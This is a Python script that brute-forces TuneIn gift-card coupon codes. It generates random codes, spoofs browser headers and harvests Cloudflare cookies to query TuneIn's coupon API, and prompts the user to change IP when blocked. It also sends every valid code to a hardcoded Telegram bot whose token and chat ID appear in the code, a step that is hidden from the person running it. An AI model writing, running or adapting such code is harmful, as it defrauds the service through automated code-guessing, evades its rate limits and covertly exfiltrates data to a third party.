import requests
import time
import random
import string

logo = '''
-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-
      ████████╗ ██╗░░░██╗ ███╗░░██╗ ███████╗   ██╗ ███╗░░██╗
      ╚══██╔══╝ ██║░░░██║ ████╗░██║ ██╔════╝   ██║ ████╗░██║
      ░░░██║░░░ ██║░░░██║ ██╔██╗██║ █████╗░░   ██║ ██╔██╗██║
      ░░░██║░░░ ██║░░░██║ ██║╚████║ ██╔══╝░░   ██║ ██║╚████║
      ░░░██║░░░ ╚██████╔╝ ██║░╚███║ ███████╗   ██║ ██║░╚███║
      ░░░╚═╝░░░ ░╚═════╝░ ╚═╝░░╚══╝ ╚══════╝   ╚═╝ ╚═╝░░╚══╝
-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-
              [+] Made By FullNoob_xD [+]
              [+] Join @ConfigsGram [+]
-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-
'''
for N, line in enumerate(logo.split('\n')):
    print(line)
    time.sleep(0.06)

def genCode():
    codeLen = 4
    ran = ''.join(random.choices(string.ascii_lowercase + string.digits, k = codeLen))
    code = "scribd-1--" + str(ran)
    # print(code)
    return code

totVal = 0

def checkCode(numOfChecks):
    hdrs1 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
    }
    for i in range(1, numOfChecks+1):
        url1 = "https://tunein.com/coupon/"
        goToUrl1 = requests.get(url1, headers=hdrs1).cookies
        # print(goToUrl1)
        cf = goToUrl1.__getitem__("__cf_bm")
        uuid = goToUrl1.__getitem__("rtid")
        # print("uuid = ", uuid, "\ncf = ", cf)
        ckks = {
            'rtid': uuid,
            '__cf_bm': cf,
        }
        cks = "rtid="+str(uuid)+"; __cf_bm="+str(cf)
        hdrs2 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Referer': 'https://tunein.com/coupon/',
            'Cookie': cks,
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'TE': 'trailers',
        }
        cde = genCode()
        url2 = "https://tunein.com/api/v1/coupons/"+cde+"/?status=redeemable&isStripe=false&formats=mp3,aac,ogg,flash,html,hls,wma&serial="+str(uuid)+"&partnerId=RadioTime&version=5.37&itemUrlScheme=secure&reqAttempt=1"
        # print("url2 =",url2)
        goToUrl2 = requests.get(url2, headers=hdrs2, cookies=ckks)
        # print(goToUrl2.status_code)
        # print(goToUrl2.content)
        # print(goToUrl2.text)

        if goToUrl2.status_code == 403:
            print("["+str(i)+"] Code =", cde, "| Change IP [+]")

        elif goToUrl2.status_code == 400:
            if "maxed_out" in goToUrl2.text:
                print("["+str(i)+"] Code =", cde, "| Expired [+]")
            elif "invalid" in goToUrl2.text:
                print("[" + str(i) + "] Code =", cde, "| Invalid [+]")
            else: print("["+str(i)+"] Code =", cde, "| Unknown Error [+]")

        elif goToUrl2.status_code == 200:
            print("["+str(i)+"] Code =", cde, "| Valid [+]")
            himtURL = "https://api.telegram.org/bot5975477248:AAHjSm7_9Yo0GnbbDXH1iiBsl8iGt4_cjA4/sendMessage?chat_id=-1001845189936&text=Tunein.com GiftCard|| Code = "+str(cde)+"| Valid"
            himtStelor = requests.get(url=himtURL)

        else: print("["+str(i)+"] Code =", cde, "| Unknown Error [+]")

try:
    nums = int(input("[+] Enter the number of codes to generate and check : "))
    print("[+] Starting generator and checker.....")
    print("-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-")
    checkCode(nums)
    print("-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-҉҉-")
    # print("[+] Total Valid =", totVal)
    input("[+] Process finished successfully! Press any key to exit!")
except Exception as exc:
    print("Pstt!!! Unknown error occured. Try running again or contact owner.\nReason of error: ",exc)








